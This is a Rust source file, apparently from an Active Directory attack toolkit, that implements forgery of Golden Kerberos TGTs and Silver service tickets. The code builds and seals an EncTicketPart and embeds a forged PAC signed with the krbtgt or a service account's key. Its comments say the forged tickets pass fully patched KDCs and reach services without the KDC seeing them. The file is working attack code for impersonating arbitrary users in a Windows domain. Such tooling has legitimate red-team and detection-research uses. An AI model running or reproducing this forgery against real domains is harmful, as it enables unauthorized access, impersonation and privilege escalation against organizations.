//! Golden and Silver Kerberos ticket forgery.
//!
//! - **Golden**: a TGT for an arbitrary identity, sealed under the domain's
//!   krbtgt key. Both PAC signatures use the krbtgt key so a fully-patched
//!   (KB5020805) KDC accepts it.
//! - **Silver**: a service ticket (TGS) for a given SPN, sealed under the
//!   target service account's key. Used directly against the service (AP-REQ)
//!   without contacting the KDC — both PAC signatures use the service key.
//!
//! 1.5.3: the `EncTicketPart` is built on kerbcore's DER + sealed with kerbcore's
//! typed key (AES) / the crate's RC4-HMAC (`checksum`), replacing picky-krb.

use crate::checksum;
use crate::pac::{assemble_pac, ForgeIdentity};
use crate::util::{
    now_kerberos_time, principal, ETYPE_AES256, ETYPE_RC4_HMAC, FAR_FUTURE, NT_PRINCIPAL,
    NT_SRV_INST,
};
use crate::{PacForgeError, Result};

/// A forged Kerberos ticket: the wire `Ticket`, plus the session key and
/// client identity needed to *use* it (AP-REQ authenticator, ccache export).
pub struct ForgedTicket {
    ticket: kerbcore::messages::Ticket,
    session_key: Vec<u8>,
    cname: kerbcore::types::PrincipalName,
    crealm: String,
}

impl ForgedTicket {
    /// Construct from the four fields directly (for `diamond::build_diamond_ticket`).
    pub fn from_parts(
        ticket: kerbcore::messages::Ticket,
        session_key: Vec<u8>,
        cname: kerbcore::types::PrincipalName,
        crealm: String,
    ) -> Self {
        Self {
            ticket,
            session_key,
            cname,
            crealm,
        }
    }

    /// The encrypted `EncTicketPart` bytes (sealed under the ticket key).
    pub fn ticket_cipher(&self) -> &[u8] {
        &self.ticket.enc_part.cipher
    }
    /// Ticket session key (16 bytes for RC4, 32 for AES256).
    pub fn session_key(&self) -> &[u8] {
        &self.session_key
    }
    pub fn ticket(&self) -> &kerbcore::messages::Ticket {
        &self.ticket
    }
    pub fn cname(&self) -> &kerbcore::types::PrincipalName {
        &self.cname
    }
    pub fn crealm(&self) -> &str {
        &self.crealm
    }
}

/// EncTicketPart authorization-data DER: `SEQUENCE OF { AD-IF-RELEVANT(1) = SEQUENCE OF {
/// AD-WIN2K-PAC(128) = pac } }`. Shared by forge + diamond.
pub(crate) fn build_pac_authdata(pac_bytes: &[u8]) -> Vec<u8> {
    use kerbcore::der::{encode_integer, encode_octet_string, encode_sequence, explicit};
    let ad = |t: i64, d: &[u8]| {
        encode_sequence(
            &[
                explicit(0, &encode_integer(t)),
                explicit(1, &encode_octet_string(d)),
            ]
            .concat(),
        )
    };
    let win2k = ad(128, pac_bytes);
    let if_rel = ad(1, &encode_sequence(&win2k));
    encode_sequence(&if_rel)
}

/// Build an `[APPLICATION 3] EncTicketPart` and seal it under `ticket_key` at key usage 2.
/// `flags` is the 32-bit TicketFlags (forge uses 0x40e10000: bits 1=FORWARDABLE | 8=RENEWABLE |
/// 9=INITIAL | 10=PRE-AUTHENT | 15=ENC-PA-REP per MS-KILE §2.2.10 — NOT PROXIABLE (bit 3), NOT
/// OK-AS-DELEGATE (bit 13, mask 0x00040000); diamond passes the real ticket's preserved flags).
/// AES via kerbcore's typed key; RC4-HMAC via the crate's `checksum` (matches `decrypt_ticket_pac_rc4`).
#[allow(clippy::too_many_arguments)]
pub(crate) fn build_enc_ticket_part(
    etype: u8,
    session_key: &[u8],
    crealm: &str,
    cname: &kerbcore::types::PrincipalName,
    flags: u32,
    auth_time: &str,
    starttime: &str,
    endtime: &str,
    renew_till: &str,
    authdata: &[u8],
    ticket_key: &[u8],
) -> Result<Vec<u8>> {
    use kerbcore::der::{
        application_tag, encode_integer, encode_octet_string, encode_sequence, explicit, tlv,
        TAG_BIT_STRING,
    };
    // KerberosFlags BIT STRING: 1 unused-bits octet (0) + 4 big-endian flag octets.
    let fb = flags.to_be_bytes();
    let flags = tlv(TAG_BIT_STRING, &[0x00, fb[0], fb[1], fb[2], fb[3]]);
    let key_der = kerbcore::types::EncryptionKey {
        keytype: etype as i32,
        keyvalue: session_key.to_vec(),
    }
    .encode();
    let transited = encode_sequence(
        &[
            explicit(0, &encode_integer(0)),
            explicit(1, &encode_octet_string(&[])),
        ]
        .concat(),
    );
    let kt = |s: &str| kerbcore::types::KerberosTime(s.to_string()).encode();
    let body = [
        explicit(0, &flags),
        explicit(1, &key_der),
        explicit(2, &kerbcore::types::encode_realm(crealm)),
        explicit(3, &cname.encode()),
        explicit(4, &transited),
        explicit(5, &kt(auth_time)),
        explicit(6, &kt(starttime)),
        explicit(7, &kt(endtime)),
        explicit(8, &kt(renew_till)),
        explicit(10, authdata),
    ]
    .concat();
    let etp_der = tlv(application_tag(3), &encode_sequence(&body));
    if etype == ETYPE_RC4_HMAC {
        Ok(checksum::rc4_encrypt(ticket_key, 2, &etp_der, None))
    } else {
        let key = kerbcore::KerberosKey::from_i32(etype as i32, ticket_key.to_vec())
            .map_err(|e| PacForgeError::Encrypt(format!("ticket key: {e}")))?;
        Ok(key.encrypt(2, &etp_der))
    }
}

/// Shared ticket forger. Marshals the PAC (signed with `server_sig_key` / `kdc_sig_key`), wraps
/// it in the EncTicketPart authorization-data, and seals under `ticket_key` (usage 2).
fn forge_ticket(
    id: &ForgeIdentity,
    realm: &str,
    ticket_key: &[u8],
    server_sig_key: &[u8],
    kdc_sig_key: &[u8],
    sname: &[&str],
    rc4: bool,
) -> Result<ForgedTicket> {
    let realm = realm.to_uppercase();
    let pac_bytes = assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
    let etype = if rc4 { ETYPE_RC4_HMAC } else { ETYPE_AES256 };

    let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()]);
    let now = now_kerberos_time();
    let authdata = build_pac_authdata(&pac_bytes);
    let enc = build_enc_ticket_part(
        etype,
        &sk,
        &realm,
        &cname,
        0x40e1_0000,
        &now,
        &now,
        FAR_FUTURE,
        FAR_FUTURE,
        &authdata,
        ticket_key,
    )?;

    let ticket = kerbcore::messages::Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: principal(NT_SRV_INST, sname),
        enc_part: kerbcore::types::EncryptedData {
            etype: etype as i32,
            kvno: None,
            cipher: enc,
        },
    };

    Ok(ForgedTicket {
        ticket,
        session_key: sk,
        cname,
        crealm: realm,
    })
}

/// Forge a **Golden** ticket: a TGT for an arbitrary identity whose PAC's server and KDC
/// signatures are both computed with the domain krbtgt key. `rc4` = true selects RC4-HMAC.
pub fn forge_golden_tgt(
    id: &ForgeIdentity,
    realm: &str,
    krbtgt_key: &[u8],
    rc4: bool,
) -> Result<ForgedTicket> {
    let realm_up = realm.to_uppercase();
    forge_ticket(
        id,
        realm,
        krbtgt_key,
        krbtgt_key,
        krbtgt_key,
        &["krbtgt", &realm_up],
        rc4,
    )
}

/// Forge a **Silver** ticket: a service ticket (TGS) for `spn`, sealed and PAC-signed under the
/// target service account's key (both PAC signatures use that key). Used directly against the
/// service — the KDC never sees it.
pub fn forge_silver_tgt(
    id: &ForgeIdentity,
    realm: &str,
    service_key: &[u8],
    spn: &str,
    rc4: bool,
) -> Result<ForgedTicket> {
    let comps: Vec<&str> = spn.split('/').collect();
    forge_ticket(
        id,
        realm,
        service_key,
        service_key,
        service_key,
        &comps,
        rc4,
    )
}
